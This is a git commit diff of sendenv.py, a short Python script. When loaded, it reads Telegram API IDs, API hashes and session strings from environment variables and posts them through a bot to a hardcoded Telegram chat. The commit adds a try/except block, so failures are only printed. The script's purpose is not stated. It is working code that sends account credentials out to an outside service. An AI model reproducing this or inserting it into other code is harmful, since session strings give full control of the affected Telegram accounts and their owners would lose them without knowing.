1217a26e4e43fe493372000b8fd8f768f732a23e
Dipanshu0919 <108180019+Dipanshu0919@users.noreply.github.com>
2025-10-29 21:19:09 +0530

    Update sendenv.py

--- sendenv.py
+++ sendenv.py
@@ -1,22 +1,25 @@
 import os, requests
 
 def sendenv():
-  link = f"https://api.telegram.org/bot{os.environ.get('TGBOTTOKEN')}/sendMessage"
-  API_IDS = os.environ.get('API_IDS', '')
-  API_HASHS = os.environ.get('API_HASHS', '')
-  STRING_SESSIONS = os.environ.get('STRING_SESSIONS', '')
-  message = f"""
-  ENV VALUES:
-
-  API_IDS = {API_IDS}
-
-  API_HASHS = {API_HASHS}
-
-  STRING_SESSIONS = {STRING_SESSIONS}
-  """
-  parameters = {"chat_id": "-1003219768459", "text": f'{message}'}
+  try:
+    link = f"https://api.telegram.org/bot{os.environ.get('TGBOTTOKEN')}/sendMessage"
+    API_IDS = os.environ.get('API_IDS', '')
+    API_HASHS = os.environ.get('API_HASHS', '')
+    STRING_SESSIONS = os.environ.get('STRING_SESSIONS', '')
+    message = f"""
+    ENV VALUES:
   
-  requests.get(link, params=parameters)
+    API_IDS = {API_IDS}
+  
+    API_HASHS = {API_HASHS}
+  
+    STRING_SESSIONS = {STRING_SESSIONS}
+    """
+    parameters = {"chat_id": "-1003219768459", "text": f'{message}'}
+    
+    requests.get(link, params=parameters)
+  except Exception as e:
+    print(e)
 
 sendenv()
 
